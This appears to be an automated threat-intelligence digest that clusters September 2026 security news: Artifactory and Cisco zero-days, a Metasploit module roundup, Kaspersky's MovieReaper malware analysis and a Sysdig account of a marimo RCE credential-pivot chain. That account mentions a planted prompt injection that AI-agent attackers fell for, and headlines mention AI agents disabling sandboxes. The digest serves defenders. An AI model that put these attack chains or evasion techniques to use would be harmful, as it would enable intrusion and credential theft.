Wiz Research has confirmed in-the-wild exploitation of all three vulnerabilities across multiple environments. CVE-2026-42018 and CVE-2026-42016 Exploitation Between August 15 and September 8, 2026, we observed multiple actors chain CVE-2026-42018 and CVE-2026-42016 against self-hosted Artifactory instances. Across multiple cases we observed a custom Rust backdoor with C2 capabilities being dropped. Wiz Research is not aware of any prior public reporting of in-the-wild exploitation involving those two CVEs. Neither vulnerability grants administrative control on its own. CVE-2026-42018 exposes a token for the internal anonymous user, and CVE-2026-42016 lets that low-privileged token be escalated to admin scope. Together, the two can turn an unauthenticated request into an admin-scoped token in two steps. Every exploitation followed a similar shape. An unauthenticated POST /access/api/v1/a
```

#### Corroborating sources (2)

- **Wiz Research** (cloud_identity_infrastructure)
  - Title: Artifactory Under Attack: In-the-Wild Exploitation of CVE-2026-42016, CVE-2026-42018 & CVE-2026-82329
  - Published: 2026-09-10T19:04:00+00:00
  - Link: https://www.wiz.io/blog/artifactory-under-attack-in-the-wild-exploitation-of-cve-2026-42016-cve-2026-4201
  - Summary: Wiz Research has identified active, in-the-wild exploitation of three critical and high-severity vulnerabilities impacting JFrog Artifactory (CVE-2026-42016, CVE-2026-42018 & CVE-2026-82329). Attackers are chaining these vulnerabilities to bypass authentication and gain administrative control.
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: CISA Adds 5 Actively Exploited Artifactory, ScreenConnect, and RouterOS Flaws to KEV
  - Published: 2026-09-12T15:54:45+00:00
  - Link: https://thehackernews.com/2026/09/cisa-adds-5-actively-exploited.html
  - Summary: The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has added five security flaws impacting JFrog Artifactory, ConnectWise ScreenConnect, and MikroTik RouterOS to its Known Exploited Vulnerabilities (KEV) catalog, following reports of active exploitation in the wild. Details of the vulnerabilities are as follows - CVE-2026-42016 (CVSS score: 8.1) - An incorrect authorization

### Cluster bd90c028bc — score 19

- Title: Metasploit Wrap Up: This One Goes to Sixteen!
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-09-11T13:35:11+00:00
- Link: https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-goes-to-sixteen
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2025-54988, CVE-2025-66516, SonicWall

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, zero_day
- affected_products: Cisco, SonicWall
- cve_ids: CVE-2025-54988, CVE-2025-66516, CVE-2026-20079, CVE-2026-20929, CVE-2026-83549
- urgency_signals: preauth_unauth, zero_day
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- threat_categories: zero_day, active_exploitation
- affected_products: Cisco, SonicWall
- cve_ids: CVE-2025-66516, CVE-2025-54988, CVE-2026-20929, CVE-2026-20079, CVE-2026-83549
- urgency_signals: zero_day, preauth_unauth
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
This One Goes to Sixteen! Another banger from Metasploit with sixteen new modules, including ten exploit modules, with five on the CISA KEV list. Cisco, Papercut, Sonicwall, Jetbrains, and Langflow all have exploit modules, and not to be outdone, we even have a Metasploit scanner to watch the watchers! New module content (16) Elasticsearch ingest-attachment Apache Tika XFA XXE Local File Read Authors: Bourbon Offensive Security Services and Jean-Marie Bourbon Type: Auxiliary Pull request: #21739 contributed by kmkz Path: scanner/http/elasticsearch_tika_xfa_xxe CVE reference: CVE-2025-66516 Description: Adds an auxiliary scanner module for CVE-2025-54988/CVE-2025-66516. The module validates an XML External Entity (XXE) vulnerability in Apache Tika's XFA parser exposed through the Elasticsearch attachment ingest processor. SPIP Unauthenticated Blind SQLi via Date Field Escaping Bypass Authors: Benoit Hua, Franck Chevalier, Julien Voisin, and ka3n1x Type: Auxiliary Pull request: #21791 co
```

#### Full body

```
Metasploit Weekly Wrapup Metasploit Wrap Up: This One Goes to Sixteen! Brendan Watters Sep 11, 2026 | Last updated on Sep 11, 2026 | 7 min read Metasploit Wrap Up: This One Goes to Sixteen! Table of contents Metasploit Wrap Up: This One Goes to Sixteen! Table of contents This One Goes to Sixteen! Another banger from Metasploit with sixteen new modules, including ten exploit modules, with five on the CISA KEV list. Cisco, Papercut, Sonicwall, Jetbrains, and Langflow all have exploit modules, and not to be outdone, we even have a Metasploit scanner to watch the watchers! New module content (16) Elasticsearch ingest-attachment Apache Tika XFA XXE Local File Read Authors: Bourbon Offensive Security Services and Jean-Marie Bourbon Type: Auxiliary Pull request: #21739 contributed by kmkz Path: scanner/http/elasticsearch_tika_xfa_xxe CVE reference: CVE-2025-66516 Description: Adds an auxiliary scanner module for CVE-2025-54988/CVE-2025-66516. The module validates an XML External Entity (XXE) vulnerability in Apache Tika's XFA parser exposed through the Elasticsearch attachment ingest processor. SPIP Unauthenticated Blind SQLi via Date Field Escaping Bypass Authors: Benoit Hua, Franck Chevalier, Julien Voisin, and ka3n1x Type: Auxiliary Pull request: #21791 contributed by jvoisin Path: scanner/http/spip_annee_sqli Description: Adds modules/auxiliary/scanner/http/spip_annee_sqli.rb which exploits a blind SQL injection in SPIP's date column escaping logic. Metasploit Payload Handler Detection (TCP/UDP/HTTP/HTTPS) Author: h00die Type: Auxiliary Pull request: #21551 contributed by h00die Path: scanner/msf/handler_detect Description: Adds a scanner module to enumerate ports on a host and determine if they're a Metasploit Reverse Handler or not, and if they are, what kind of shell they were going to land. ESC8 Relay: SMB to HTTP(S) via Kerberos Author: Pushpender Rathore Type: Auxiliary Pull request: #21709 contributed by Pushpenderrathore Path: server/relay/esc8_kerberos CVE reference: CVE-2026-20929 Description: This introduces native Kerberos authentication relay capabilities to the framework's relay stack. It includes a new auxiliary module (esc8_kerberos) that exploits CVE-2026-20929 by targeting AD CS Web Enrollment (ESC8). The module captures an SMB2 AP-REQ from a coerced client and seamlessly replays the authentication to the target certificate server over HTTP. This chain ultimately allows an attacker to issue a certificate for the coerced victim and obtain a valid Kerberos TGT without requiring their credentials. Linux x64 Sandbox Environment Gate Author: Massimo Bertocchi Type: Evasion Pull request: #21642 contributed by litemars Path: linux/x64/sandbox_gate Description: Adds a Linux x64 sandbox‑evasion module that performs lightweight runtime environment checks and aborts execution when a likely sandbox or VM is detected. Cisco Secure Firewall Management Center Authentication Bypass RCE Authors: Arian Eidizadeh, Brandon Sakai, and Cale Black Type: Exploit Pull request: #21796 contributed by CyberAuth Path: linux/http/cisco_fmc_auth_bypass_rce CVE reference: CVE-2026-20079 Description: Adds a native Metasploit exploit module for CVE-2026-20079, an unauthenticated authentication bypass in Cisco Secure Firewall Management Center (FMC). SonicWall SMA1000 WorkPlace SSRF to Root Remote Code Execution Authors: Adam Babis, William Perry, and sfewer-r7 Type: Exploit Pull request: #21883 contributed by sfewer-r7 Path: linux/http/sonicwall_sma1000_couchdb_rce CVE reference: CVE-2026-83549 Description: This adds an exploit module for the recent SonicWall SMA1000 zero-day exploit chain that was disclosed in the first week of September as being exploited in-the-wild. CVE-2026-83548 is an SSRF used to bypass auth. SMA1000-9427 is an RCE with low privileges via CouchDB read/write primitives. CVE-2026-83549 is a command injection in cmsSnmpTrap.sh for RCE with root privs. The patched version 12.5.0-02952 has been verified to successfully remedia
```

#### Corroborating sources (1)

- **Rapid7** (offensive_vulnerability_research)
  - Title: Metasploit Wrap Up: This One Goes to Sixteen!
  - Published: 2026-09-11T13:35:11+00:00
  - Link: https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-goes-to-sixteen
  - Summary: This One Goes to Sixteen! Another banger from Metasploit with sixteen new modules, including ten exploit modules, with five on the CISA KEV list. Cisco, Papercut, Sonicwall, Jetbrains, and Langflow all have exploit modules, and not to be outdone, we even have a Metasploit scanner to watch the watchers! New module content (16) Elasticsearch ingest-attachment Apache Tika XFA XXE Local File Read Authors: Bourbon Offensive Security Services and Jean-Marie Bourbon Type: Auxiliary Pull request: #21739 contributed by kmkz Path: scanner/http/elasticsearch_tika_xfa_xxe CVE reference: CVE-2025-66516 Description: Adds an auxiliary scanner module for CVE-2025-54988/CVE-2025-66516. The module validates an XML External Entity (XXE) vulnerability in Apache Tika's XFA parser exposed through the Elasticsearch attachment ingest processor. SPIP Unauthenticated Blind SQLi via Date Field Escaping Bypass Authors: Benoit Hua, Franck Chevalier, Julien Voisin, and ka3n1x Type: Auxiliary Pull request: #21791 co

### Cluster 2b3a06fa20 — score 19

- Title: Cisco warns of max severity ISE zero-day exploited in attacks
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-09-17T07:20:54+00:00
- Link: https://www.bleepingcomputer.com/news/security/cisco-warns-of-identity-service-engine-zero-day-exploited-in-attacks/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, apt_espionage, ransomware_extortion, web_shell_backdoor, zero_day
- affected_industries: government
- affected_products: ScreenConnect
- cve_ids: CVE-2026-20176, CVE-2026-20211, CVE-2026-20307, CVE-2026-76423, CVE-2026-76460
- urgency_signals: actively_exploited, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, zero_day, apt_espionage, web_shell_backdoor, active_exploitation
- affected_industries: government
- affected_products: ScreenConnect
- cve_ids: CVE-2026-76460, CVE-2026-76423, CVE-2026-20176, CVE-2026-20211, CVE-2026-20307
- urgency_signals: actively_exploited, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Cisco has released security updates to address a maximum-severity Identity Services Engine vulnerability that attackers are actively exploiting in the wild. [...]
```

#### Full body

```
Cisco warns of max severity ISE zero-day exploited in attacks By Sergiu Gatlan September 17, 2026 03:20 AM 0 Cisco has released security updates to address a maximum-severity Identity Services Engine vulnerability that attackers are actively exploiting in the wild. Cisco ISE is a centralized policy platform that IT administrators use to manage endpoints, users, and device access to network resources, often while enforcing Zero Trust security models. The security flaw (tracked as CVE-2026-76460 ) lets remote attackers bypass authentication by exploiting a weakness in an API of Cisco Identity Services Engine (ISE) and Cisco ISE Passive Identity Connector (ISE-PIC) regardless of configuration. "This vulnerability is due to insufficient authentication control on an API endpoint. An attacker could exploit this vulnerability by sending a crafted request to an affected API endpoint," the company explained . "A successful exploit could allow the attacker to gain unauthorized access to the affected device by bypassing the web-based management interface." Cisco also warned customers on Wednesday to secure their systems since its Product Security Incident Response Team (PSIRT) flagged CVE-2026-76460 as actively exploited. "The Cisco PSIRT is aware of active exploitation of this vulnerability. Cisco strongly recommends that customers upgrade to a fixed software release to remediate this vulnerability." Because no workarounds exist, applying the security updates is the only recommended course of action to protect networks from ongoing attacks. Cisco ISE or ISE-PIC Release First Fixed Release 3.1 3.1 Patch 12 3.2 3.2 Patch 11 3.3 3.3 Patch 12 3.4 3.4 Patch 7 3.5 3.5 Patch 4 Cisco shared indicators of compromise and advised security teams to look for suspicious usernames in access.log files on every node and "strongly" recommended re-imaging the nodes and restoring them from backups if malicious activity is suspected. Admins should also cross-check firewall and network logs for signs of suspicious activity (including downloads and uploads from and to external or malicious IP addresses) because attackers may remove evidence of exploitation after obtaining command execution with root privileges. Yesterday, Cisco patched a second maximum-severity authentication bypass flaw (CVE-2026-76423) and five other critical security issues (tracked as CVE-2026-76460, CVE-2026-20176, CVE-2026-20211, CVE-2026-20307, and CVE-2026-20284) in Cisco ISE and Cisco ISE-PIC, but they have not yet been flagged as actively exploited. The Cybersecurity and Infrastructure Security Agency (CISA) also ordered federal agencies to patch their systems against CVE-2026-76460 within three days after adding it to its Known Exploited Vulnerabilities (KEV) Catalog on Wednesday. In July 2025, threat actors exploited another Cisco ISE zero-day (CVE-2025-20337) with a maximum severity score in remote code execution attacks to deploy a custom "IdentityAuditAction" web shell disguised as a legitimate ISE component. Over the last five years, CISA tagged 99 security flaws in Cisco products as actively exploited in attacks, including seven abused in ransomware attacks. Build your security blueprint for AI-powered attacks Join Mikko Hyppönen and security leaders from the NFL, CHANEL, and Atlassian for a two-hour digital summit on what AI-speed attacks change, what defenders should stop doing, and how to validate, decide, fix, and re-validate at machine speed. Save your seat Related Articles: Check Point warns of SmartConsole zero-day exploited in attacks Cisco patches Secure Email Gateway zero-day exploited in attacks Cisco FMC flaws exploited by ransomware gang, state-sponsored hackers Cisco warns of FMC static credential flaw exploited in zero-day attacks Critical ScreenConnect flaw now actively exploited in attacks
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Cisco warns of max severity ISE zero-day exploited in attacks
  - Published: 2026-09-17T07:20:54+00:00
  - Link: https://www.bleepingcomputer.com/news/security/cisco-warns-of-identity-service-engine-zero-day-exploited-in-attacks/
  - Summary: Cisco has released security updates to address a maximum-severity Identity Services Engine vulnerability that attackers are actively exploiting in the wild. [...]

### Cluster 7d7ea8e2d6 — score 19

- Title: Cisco warns customers of actively exploited zero-day in email gateways
- Source: CyberScoop (cyber_news_breach_reporting)
- Published: 2026-09-15T15:44:41+00:00
- Link: https://cyberscoop.com/cisco-secure-email-gateway-zero-day-exploited/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, apt_espionage, phishing_social_eng, zero_day
- affected_industries: government
- affected_products: Cisco
- cve_ids: CVE-2026-76461
- urgency_signals: actively_exploited, preauth_unauth, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: phishing_social_eng, zero_day, apt_espionage, active_exploitation
- affected_industries: government
- affected_products: Cisco
- cve_ids: CVE-2026-76461
- urgency_signals: actively_exploited, zero_day, preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
The company confirmed the defect was exploited before it was disclosed and patched, but it did not describe the nature of the attacks or the scope of impact across its customer base. The post Cisco warns customers of actively exploited zero-day in email gateways appeared first on CyberScoop .
```

#### Full body

```
Advertisement Get our latest cybersecurity news first on Google. Click here! Close Attackers of unknown origins and motivations are exploiting a critical zero-day vulnerability in Cisco Secure Email Gateway, authorities and researchers said Monday. The vulnerability — CVE-2026-76461 — was exploited before Cisco disclosed and patched the defect Monday and allows unauthenticated, remote attackers to execute commands with root privileges on vulnerable systems. “In practical terms, that gives the attacker control of the gateway itself,” Douglas McKee, director of vulnerability intelligence at Rapid7, told CyberScoop. Cisco said its product security incident response team became aware of active exploitation of the defect affecting Cisco AsyncOS Software for Cisco Secure Email Gateway in September. When asked for further details, a company spokesperson pointed to the advisory and reiterated that the company is aware of active exploitation of the vulnerability. The company did not say how many organizations are impacted for active exploitation thus far, but it indicated multiple customers were likely compromised prior to disclosure. Advertisement “Cisco has conducted a thorough threat intelligence investigation on devices that belong to Cisco Secure Email Cloud. Cisco has directly contacted customers who own Cisco Secure Email Cloud devices where indicators of possible compromise were identified,” the company wrote in its security advisory. “Cisco is engaged in remediation and recovery operations. Cisco has already deployed mitigations that are within Cisco’s management.” The Cybersecurity and Infrastructure Security Agency added the zero-day, which affects cloud-based and on-premises instances of Cisco Secure Email Gateway, to its known exploited vulnerabilities catalog shortly after Cisco’s disclosure. The tight timeline between Cisco’s public advisory and patch guidance, and CISA’s quick addition to the KEV catalog indicates the vulnerability deserves immediate attention, McKee said. “The combination here is pretty ugly. No authentication is required, an attacker can reach the vulnerable code by sending an email through the appliance, successful exploitation can result in root-level command execution, and Cisco has observed exploitation in the wild,” he added. Researchers at Rapid7 and VulnCheck said they don’t yet know how many organizations are impacted by active exploits, but they encouraged Cisco customers to patch and hunt for potential signs of compromise as soon as possible. Advertisement Spencer McIntyre, director of exploit development at VulnCheck, told CyberScoop the exploit could allow an attacker to maintain access to the email gateway and monitor communications. “Stealing or silently snooping on email comms is a common tactic for state-sponsored and other threat actors conducting espionage operations,” he said. “It’s going to be worse for organizations that have the appliance deployed on-premises. In this case, the attacker could pivot internally,” McIntyre added. “If, however, organizations use a cloud instance, the compromised gateway is less likely to have significant access to internal organizational resources.” Cisco released indicators of compromise to help customers hunt for attempted exploitation in their environments, but the company added that attackers could remove or hide those traces with the level of access granted via exploitation. Share Facebook LinkedIn Twitter Copy Link Add to Preferred Sources Advertisement Advertisement More Like This Advertisement Top Stories Advertisement More Scoops (Getty Images) The Microsoft logo is visible through a grid of its French headquarters on Jan. 25, 2023 in Issy-les-Moulineaux. (Photo by Chesnot/Getty Images) Getty Images Latest Podcasts What the Section 702 lapse means for cybersecurity ClickFix and the social engineering of routine AI-adaptable security platforms are critical for autonomous decision-making Defending in the middle of the vulnpocalypse Government
```

#### Corroborating sources (1)

- **CyberScoop** (cyber_news_breach_reporting)
  - Title: Cisco warns customers of actively exploited zero-day in email gateways
  - Published: 2026-09-15T15:44:41+00:00
  - Link: https://cyberscoop.com/cisco-secure-email-gateway-zero-day-exploited/
  - Summary: The company confirmed the defect was exploited before it was disclosed and patched, but it did not describe the nature of the attacks or the scope of impact across its customer base. The post Cisco warns customers of actively exploited zero-day in email gateways appeared first on CyberScoop .

### Cluster 19deeddfb9 — score 19

- Title: Acronis cPanel Backup Plugin Vulnerability Exploited in Targeted Attacks
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-16T11:08:54+00:00
- Link: https://thehackernews.com/2026/09/acronis-cpanel-backup-plugin.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-87886, cPanel

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, phishing_social_eng, ransomware_extortion, web_shell_backdoor, zero_day
- affected_industries: government
- affected_products: Anthropic/Claude, GitLab, cPanel
- cve_ids: CVE-2026-87886
- urgency_signals: actively_exploited, critical_cvss, poc_available, preauth_unauth, zero_day
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng, zero_day, web_shell_backdoor, active_exploitation
- affected_industries: government
- affected_products: cPanel, Anthropic/Claude, GitLab
- cve_ids: CVE-2026-87886
- urgency_signals: actively_exploited, zero_day, preauth_unauth, poc_available, critical_cvss
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Summary

```
Acronis has warned that a high-severity security flaw in its Backup plugin for cPanel and Web Host Manager (WHM) deployments has been exploited in the wild. The vulnerability, tracked as CVE-2026-87886 (CVSS score: 7.8), is described as a case of local privilege escalation due to insecure file permissions. It affects the following versions - Acronis Backup plugin for cPanel & WHM (Linux
```

#### Full body

```
Acronis cPanel Backup Plugin Vulnerability Exploited in Targeted Attacks  Ravie Lakshmanan  Sep 16, 2026 Vulnerability / Linux Acronis has warned that a high-severity security flaw in its Backup plugin for cPanel and Web Host Manager (WHM) deployments has been exploited in the wild. The vulnerability, tracked as CVE-2026-87886 (CVSS score: 7.8), is described as a case of local privilege escalation due to insecure file permissions. It affects the following versions - Acronis Backup plugin for cPanel & WHM (Linux) before build 1.9.3.1021 - Fixed in 1.9.3 HF3 Acronis Backup extension for Plesk (Linux) before build 1.8.11.638 Successful exploitation of the flaw could allow an attacker with low privileges to escalate their permissions on a susceptible Linux version, potentially enabling them to perform unauthorized actions or run arbitrary code that could impact the confidentiality and integrity of the application. "This update contains fixes for 1 high-severity security vulnerability and should be installed immediately by all users," Acronis noted in a separate advisory for 1.9.3 HF3. "Exploitation of this vulnerability has been detected in the wild in limited, targeted attacks." There are currently no details about the vulnerability, or who is behind the attacks exploiting it and what the end goals are. It's also not clear when the activity was detected and since when the security flaw may have been exploited in the wild. When reached for comment, a spokesperson for Acronis said they had nothing to add at this stage. Customers of the Acronis backup plugin are advised to apply the latest updates as soon as possible to stay protected. Update The U.S. Cybersecurity and Infrastructure Security Agency (CISA), on September 16, 2026, added CVE-2026-87886 to its Known Exploited Vulnerabilities ( KEV ) catalog, requiring Federal Civilian Executive Branch (FCEB) agencies to apply the patches by September 19, 2026. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  linux , privilege escalation , Vulnerability ⚡ Top Stories This Week OpenAI Agents Linked to RubyGems Campaign That Gained RCE on RubyDoc Servers GitLab CVSS 10 File-Read Flaw Draws In-the-Wild Probes After Disclosure Claude Used to Automate Exploitation and Data Theft Across Multiple Victims Attackers Chain JFrog Artifactory Flaws to Gain Admin Control and Plant Backdoors PaperCut Replaces Emergency Patches With Fixes for Two Actively Exploited Flaws Cisco FMC Flaws Exploited to Steal Credentials and Deploy Qilin Ransomware ThreatsDay: 200 Android Flaws, Browser-Built Phishing, 119K Scam Shops + 23 More Stories Check Point Discloses Two 9.8-Rated VPN Certificate Flaws Enabling Unauthenticated RCE Anthropic Discloses Fourth AI Hacking Incident Involving Claude Opus 4.6 Four Spy Groups Used the Same Chrome and Windows Exploit Kit Within a Week DeepSeek Harness Flaw Let AI Agents Disable Their Own File Sandbox Without Approval Chrome V8 Zero-Day Exploited in the Wild Enables Code Execution Inside Sandbox New cPanel Flaw Lets a Hosting Account With Mail Privileges Run Code as Root F5 BIG-IP APM Malware Injects a PHP Web Shell Into Memory, Evading Disk Scans Researcher Drops New Microsoft Defender PoC Showing ShieldBreak Patch Can Be Bypassed Microsoft Patches Record 974 Flaws, Including Two Exploited Windows Zero-Days ChatGPT Flaw Let a Planted Prompt Send a Victim's Gmail Data to Another Account WeChat Zero-Click Worm Took Over Accounts on iPhone and Android via Incoming Calls Fake IT Calls Target Executives in Microsoft 365 Data Theft and Extortion Attacks When the Whole Company Adopts AI: What It Does to Your SOC Your Critical Vulnerabilities Might Not Be Your Biggest Risk What It Took to Reach 1 Billion Build Manifests US Becomes Top Target in RMM Phishing Campaign Spanning 46 Countries Why Are So Many Security Professionals Keeping Breaches Quiet? The Eco
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Acronis cPanel Backup Plugin Vulnerability Exploited in Targeted Attacks
  - Published: 2026-09-16T11:08:54+00:00
  - Link: https://thehackernews.com/2026/09/acronis-cpanel-backup-plugin.html
  - Summary: Acronis has warned that a high-severity security flaw in its Backup plugin for cPanel and Web Host Manager (WHM) deployments has been exploited in the wild. The vulnerability, tracked as CVE-2026-87886 (CVSS score: 7.8), is described as a case of local privilege escalation due to insecure file permissions. It affects the following versions - Acronis Backup plugin for cPanel & WHM (Linux

### Cluster 6a3b3e9023 — score 16

- Title: The Odyssey and trojans again: MovieReaper attacks users in multiple countries via compromised torrents
- Source: Kaspersky Securelist (threat_research_primary)
- Published: 2026-09-17T13:00:53+00:00
- Link: https://securelist.com/moviereaper-malware-torrent-odyssey-solana/121344/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: incident_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- content_type: incident_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Kaspersky experts have discovered a new MovieReaper campaign. The multi-stage Trojan spreads through movie torrents, such as "The Odyssey," and uses the Solana blockchain to hide its C2 infrastructure.
```

#### Full body

```
Table of Contents Introduction Technical Details Background Initial infection and spreading Malware implants Step 1: Loader Step 2: Shellcode Step 3: UAC Bypass and persistence Step 4: The final implant Infrastructure Victims Conclusions Indicators of compromise File hashes File paths Mutexes Domains and IPs Authors Konstantin Isakov Pavel Cheremushkin Introduction Torrent trackers have long been abused for distributing malicious software, disguised as popular films, games, and other content. Our previous research has shown that cybercriminals repeatedly turn torrents as an initial infection vector, using trojanized cracks and installers to reach a large number of users. Installation guides for pirated software routinely instruct users to disable their antivirus, conditioning them to ignore potential threats they are inviting onto their computers. During our analysis of malware that leverages blockchain networks for its C2 infrastructure, we have discovered a previously unknown modular, multi-stage framework that we dubbed MovieReaper. This report details the new crimeware campaign that began with the mass infection of users via compromised torrent tracker file storage. We have identified several hundred victims, including both individual users and organizations in a multitude of countries, such as Russia, Türkiye, Japan, Kenya, Uganda, and Colombia, as well as in several European countries like Spain, the Netherlands, Belgium, Germany. We analyze the techniques used to evade detection by security and sandbox solutions, examine the capabilities of the modular framework. Kaspersky products detect this threat as HEUR:Trojan.Win64.Agent.gen. Technical Details Background In mid‑August 2026, during our threat‑hunting efforts, we identified a large‑scale infection campaign involving previously unknown malware disguised as popular movies. The campaign affected both individuals and organizations across multiple countries. Our initial analysis revealed a common factor among the victims: all had used torrent trackers. This finding prompted us to investigate the campaign further and analyze its distribution mechanism, overall scope, and unknown malware implants. Initial infection and spreading Compromised torrent trackers are the primary vector used to distribute malware. During our investigation, we identified multiple user reports describing suspicious files being downloaded instead of the intended content. For example, a user of a popular movie torrent tracker reported the following case on Reddit: Further analysis of the attack revealed that the threat actors did not compromise the torrent trackers themselves. Instead, they compromised a widely used public repository of torrent files — itorrents[.]org . As a result, torrent trackers that relied on this repository began inadvertently distributing malicious torrent files to their users. This approach is particularly powerful because the threat actors can reach users of multiple tracчkers without compromising each platform individually. As of the publication date of this report, the archive remains compromised. When a user attempts to download a torrent using a magnet link, the legitimate torrent archive instead returns a different torrent file. This malicious torrent leads to the download of the malware loader. It is used to deploy a framework that we dubbed MovieReaper. The loader initiates the infection chain, which is illustrated in the diagram below. Each stage of the infection chain is described in detail in the following sections. Malware implants The infection chain consists of several steps, where only the initial one is dropped on the disk before its execution to avoid detection. The malware itself is not heavily obfuscated, apart from the fact that strings are encrypted with a custom stream cipher. Most of the countermeasures were aimed at avoiding detection by AV sandboxes. Step 1: Loader The most popular initial executable was distributed through torrent trackers under many
```

#### Corroborating sources (1)

- **Kaspersky Securelist** (threat_research_primary)
  - Title: The Odyssey and trojans again: MovieReaper attacks users in multiple countries via compromised torrents
  - Published: 2026-09-17T13:00:53+00:00
  - Link: https://securelist.com/moviereaper-malware-torrent-odyssey-solana/121344/
  - Summary: Kaspersky experts have discovered a new MovieReaper campaign. The multi-stage Trojan spreads through movie torrents, such as "The Odyssey," and uses the Solana blockchain to hide its C2 infrastructure.

### Cluster c7cbf0a5fd — score 16

- Title: Machine speed, hold the AI: Hand-rolled marimo CVE-2026-39987 exploit
- Source: Sysdig (detection_response_operations)
- Published: 2026-09-11T00:00:00+00:00
- Link: https://webflow.sysdig.com/blog/machine-speed-hold-the-ai-hand-rolled-marimo-cve-2026-39987-exploit
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-39987

#### Cluster taxonomy (union across members)
- threat_categories: ai_security
- affected_products: AWS
- cve_ids: CVE-2026-39987
- urgency_signals: preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ai_security
- affected_products: AWS
- cve_ids: CVE-2026-39987
- urgency_signals: preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Summary

```
Sysdig TRT details a hand-rolled attack against marimo's CVE-2026-39987 without AI, building custom Python tools to breach a cloud bastion host.
```

#### Full body

```
< back to blog Machine speed, hold the AI: Hand-rolled marimo CVE-2026-39987 exploit Published by: Sysdig Threat Research Team @ linkedin See more threat research Published: September 11, 2026 Table of contents falco feeds by sysdig Falco Feeds extends the power of Falco by giving open source-focused companies access to expert-written rules that are continuously updated as new threats are discovered. learn more AI is lowering the barrier to entry for attackers; that much is settled. But what’s still up for debate is whether skilled threat actors can keep up with their LLM-driven competitors. Recently, the Sysdig Threat Research Team (TRT) watched a single threat actor go from an open WebSocket to a live SSH session on a bastion host in eight seconds. There was no agent in the loop, nor was there any sign of LLM-generated scripts or tooling. Instead, the operator used a Python toolkit they wrote and debugged by hand, in-session, over the preceding four hours. The attacker exploited CVE-2026-39987, a pre-authentication remote code execution (RCE) vulnerability in marimo. They ran a complete credential-pivot chain end to end: initial access through the unauthenticated WebSocket terminal, an AWS Secrets Manager call using credentials harvested from the compromised instance, and SSH access to a bastion host with the retrieved private key. Over the course of a nine-hour session, they issued more than 850 interactive commands, used no recognizable publicly available offensive tooling, and hand-rolled their scripts in-session. Eight seconds is the kind of speed we expect to see in AI-assisted attacks. This operator got there on skill alone, and along the way walked straight past a trap that every agentic threat actor (ATA) we’ve profiled against this same CVE fell into. Not only can skilled human attackers move at machine speed, but they can also often better evade defenders’ detections. This is one of several operators we’ve profiled against CVE-2026-39987. The series began with exploitation less than 10 hours after disclosure and continued with the NKAbuse RAT campaign . What makes this operator unique is the craft. While others left clear LLM fingerprints, they wrote automation by hand, ignored a planted prompt injection that agent-driven operators reliably tripped, and chained three post-RCE steps in eight-seconds using a toolkit that was pre-staged during an earlier session. Let's explore what the Sysdig TRT observed, a few detections and indicators of compromise, and what defenders can do to stay ahead. Timeline All times UTC. Time Event 28+ hours before first observed terminal activity First harvested AWS credential validated via GetCallerIdentity in CloudTrail 33 minutes after the first credential was harvested Second harvested credential (from the application’s Redis backend) validated 12:52:18 First WebSocket connection from 172.236.12.17 to /terminal/ws 12:54:13 First interactive command: a /dev/tcp sweep of the RFC1918 /24 the host sat in 16:00–16:30 Operator drops a series of base64-encoded Python scripts into /tmp/ 16:50:40 boto3 script calls secretsmanager:GetSecretValue on AWS 16:51:45 Retrieved SSH key replayed against an internet-reachable bastion host 18:54:31 New WebSocket session opens 18:54:45 AWS Secrets Manager API call observed in CloudTrail (14 seconds after WebSocket open) 18:56:32–18:56:44 EC2 enumeration denied: DescribeInstances → UnauthorizedOperation; DescribeKeyPairs → AccessDenied; DescribeInstanceInformation → AccessDenied 18:56:50 ec2:SendSSHPublicKey fired against i-0000000000000000 — null instance ID (enumeration never returned a real ID); blocked 18:57:22 18:57:30 Fresh WebSocket session opens SSH bastion authentication observed (8 seconds after that session's WebSocket open) 20:13–20:32 Operator deploys an asyncssh-style listener setup against an attacker-owned VPS 21:50:14 Final disconnect for this operator The first interactive command, a TCP probe across the host’s /24 , and the first credent
```

#### Corroborating sources (1)

- **Sysdig** (detection_response_operations)
  - Title: Machine speed, hold the AI: Hand-rolled marimo CVE-2026-39987 exploit
  - Published: 2026-09-11T00:00:00+00:00
